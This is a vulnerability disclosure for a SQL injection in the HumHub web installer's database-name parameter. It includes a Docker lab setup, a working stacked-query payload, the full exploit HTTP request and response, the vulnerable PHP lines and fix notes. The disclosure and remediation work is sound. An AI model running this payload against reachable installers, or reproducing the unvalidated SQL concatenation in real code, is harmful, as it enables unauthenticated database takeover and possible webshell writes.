### Vulnerability details

**Official website / Product:** https://www.humhub.com/

**Repository:** https://github.com/humhub/humhub (stars at selection: 6770)

**Vulnerability type:** SQLi (stacked / blind time-based)

**Vulnerable versions:** <= v1.19.3 (sink confirmed on tag v1.19.3 / commit `54c5447961d05e319d124d8d000fe3ca560e9e44`; Docker-verified on `mriedmann/humhub:latest` = 1.17.1)

**Vulnerability URL / Parameter:** `POST /installer/setup/database` — parameter `DatabaseForm[database]` when `DatabaseForm[create]=1`

**Complex:** yes

### Verification procedure

1. Start HumHub with the **installer still reachable** (do not set `HUMHUB_AUTO_INSTALL`; use a fresh volume). In any directory, write the following compose (matches the verification run) and start it:

```yaml
# docker-compose.yml
services:
  humhub:
    image: mriedmann/humhub:latest
    container_name: humhub-r24a4-installer
    ports:
      - "20414:80"
    environment:
      HUMHUB_DB_HOST: db
      # NO auto install - leave installer open
      HUMHUB_DEBUG: "1"
      HUMHUB_PROTO: http
      HUMHUB_HOST: 127.0.0.1:20414
    depends_on:
      db:
        condition: service_healthy
    networks:
      - hhinst
  db:
    image: mariadb:10.11
    container_name: humhub-r24a4-installer-db
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: unused
      MYSQL_USER: humhub
      MYSQL_PASSWORD: humhub
    healthcheck:
      test: ["CMD", "healthcheck.sh", "--connect", "--innodb_initialized"]
      interval: 5s
      timeout: 5s
      retries: 30
    networks:
      - hhinst
networks:
  hhinst:
```

```bash
docker compose up -d
# Wait until http://127.0.0.1:20414/installer is reachable; DB user/pass humhub/humhub, hostname db on the compose network
```

2. Walk the installer so `/installer/setup/database` is reachable:
   - `GET /installer/index` → `GET /installer/index/go` → `GET /installer/setup/prerequisites` → `GET /installer/setup/database`.
3. Obtain the Yii CSRF token (**Cookie / `_csrf` in the PoC are session-bound; do not replay them blindly**):

```bash
curl -s -c /tmp/hh.ck -b /tmp/hh.ck 'http://127.0.0.1:20414/installer/setup/database' -o /tmp/hh-db.html
# Extract from hidden input name="_csrf" or <meta name="csrf-token">; cookie jar holds _csrf
CSRF=$(sed -n 's/.*name="_csrf" value="\([^"]*\)".*/\1/p' /tmp/hh-db.html | head -1)
```

4. Submit a reachable DB host/user/password (lab: `hostname=db`, `username=humhub`, `password=humhub`) and set `DatabaseForm[create]=1`.
5. Set `DatabaseForm[database]` to ``poc_r24a4`;SELECT SLEEP(3);-- `` (backtick closes the `CREATE DATABASE` identifier, stacked `SELECT SLEEP(3)` runs, `--` comments out the trailing SQL).
6. Observe HTTP response time ≈ 3s and `302` to `/installer/setup/migrate`; MariaDB contains database `poc_r24a4`:

```bash
docker exec humhub-r24a4-installer-db mariadb -uhumhub -phumhub -e "SHOW DATABASES LIKE 'poc%';"
# Expected output:
# Database (poc%)
# poc_r24a4
```

### Complete vulnerability PoC

Complete HTTP request (Docker-verified; refresh CSRF per step 3 before replay):

```http
POST /installer/setup/database HTTP/1.1
Host: 127.0.0.1:20414
User-Agent: curl/8.22.0
Accept: */*
Cookie: _csrf=93a3c691ef73462318d062a1ebf8c227f2d81eb1e85dc96bc2967fe0d73bfb59a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22p3ezlk-QcuwPuOnvKuB6c4-JHrGW9nZG%22%3B%7D
Content-Type: application/x-www-form-urlencoded
Origin: http://127.0.0.1:20414
Referer: http://127.0.0.1:20414/installer/setup/database
Content-Length: 315
Connection: close

_csrf=L8Gc8pF9MuP_yXDutd_IuxFvY0aXTsmqIKE9xlCf4vpf8vmI_RYfspy8B77AkKbNWhohcPR65OBo03qRafG4vQ%3D%3D&DatabaseForm%5Bhostname%5D=db&DatabaseForm%5Bport%5D=&DatabaseForm%5Busername%5D=humhub&DatabaseForm%5Bpassword%5D=humhub&DatabaseForm%5Bdatabase%5D=poc_r24a4%60%3BSELECT+SLEEP%283%29%3B--+&DatabaseForm%5Bcreate%5D=1
```

URL-decoded body fields of interest: `DatabaseForm[database]=poc_r24a4`;SELECT SLEEP(3);-- `, `DatabaseForm[create]=1`.

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 302 Found
Server: nginx/1.24.0
Date: Sun, 01 Nov 2026 21:32:08 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.2.26
Strict-Transport-Security: max-age=31536000
X-Content-Type-Options: nosniff
Referrer-Policy: no-referrer-when-downgrade
X-Permitted-Cross-Domain-Policies: master-only
X-Frame-Options: sameorigin
Location: http://127.0.0.1:20414/installer/setup/migrate
```

Verification result notes:

- Measured `TIME=3.051452` with `SLEEP(3)` payload (baseline without SLEEP is ~0.04s):
  ```
  curl timing: TIME=3.051452 CODE=302
  Location: http://127.0.0.1:20414/installer/setup/migrate
  MariaDB SHOW DATABASES LIKE 'poc%':
  poc_r24a4
  Stacked payload executed: CREATE DATABASE `poc_r24a4`; SELECT SLEEP(3);--
  ```
- Response `302 Found` with `Location: http://127.0.0.1:20414/installer/setup/migrate`.
- MariaDB: `SHOW DATABASES LIKE 'poc%'` returns `poc_r24a4` (stacked payload ran both `CREATE DATABASE` and `SELECT SLEEP(3)`).
- Same string-concat sinks exist in audited tag v1.19.3 `SetupController.php` lines 84–88.

### Vulnerability analysis

During web installation, when the operator checks "Create the database if it doesn't exist yet", `SetupController::actionDatabase()` builds two SQL statements by concatenating the user-supplied database name without identifier quoting/whitelist validation:

1. `SHOW DATABASES LIKE "<database>"` — double-quote breakout.
2. `CREATE DATABASE \`<database>\` CHARACTER SET ...` — backtick breakout enabling **stacked queries** (MariaDB/PDO accepted multi-statements in the lab).

`DatabaseForm::rules()` only marks `database` as `required` (string); there is no `/^[A-Za-z0-9_]+$/` (or similar) constraint. An unauthenticated attacker who can reach the installer (fresh deploy, misconfigured re-install, or installer left exposed) can execute arbitrary SQL as the configured MySQL user (often high privilege during setup), including time-based blind exfiltration and schema/data modification. On deployments where MySQL and the web root share a filesystem and `FILE` is granted, this can further chain to webshell write via `INTO OUTFILE`.

Trigger / sink source (full path and line numbers):

```php
# File: protected/humhub/modules/installer/controllers/SetupController.php
# Lines: 84-88 (tag v1.19.3)
                    if (!$temporaryConnection->createCommand('SHOW DATABASES LIKE "' . $model->database . '"')
                        ->execute()) {
                        $temporaryConnection->createCommand(
                            'CREATE DATABASE `' . $model->database . '` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci',
                        )->execute();
                    }
```

`DatabaseForm` rules (no format whitelist) at `protected/humhub/modules/installer/forms/DatabaseForm.php` lines 66–73: `[['hostname', 'username', 'database'], 'required']` only — no identifier whitelist such as `/^[A-Za-z0-9_]+$/`.

### Fix notes

- Validate `database` (and `hostname`) with a strict whitelist, e.g. `^[A-Za-z0-9_]+$`.
- Never concatenate identifiers into SQL; use a hard-coded `CREATE DATABASE` only after whitelist validation, or reject `create` and require a pre-created empty database.
- Prefer quoting via the DB driver's quoteTableName after validation (still whitelist first — quoting alone is insufficient against backtick escape).
- Ensure the installer remains unreachable after `InstallationState::STATE_INSTALLED` (already intended; keep fail-closed).
